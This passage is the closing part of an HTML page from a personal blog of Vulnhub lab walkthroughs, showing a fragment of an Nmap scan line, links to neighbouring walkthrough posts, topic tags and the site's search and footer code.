2021-08-12 18:52 EDT Nmap scan report for Home (172.16.129.1) Host is up...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/KIOPTRIX_LEVEL_1.3/" class="btn btn-outline-primary" prompt="Older"><p>KIOPTRIX LEVEL 1.3 (#4) - Vulnhub Walkthrough</p></a> <a href="/posts/ESCALATE-MY-PRIVILEGES/" class="btn btn-outline-primary" prompt="Newer"><p>ESCALATE MY PRIVILEGES - Vulnhub Walkthrough</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/maaelhamid">Mohamed Ayman</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege_escalation</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/kioptrix/">kioptrix</a> <a class="post-tag" href="/tags/escalate-my-privileges/">ESCALATE_MY_PRIVILEGES</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/30x/">30x</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://maaelhamid.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script>
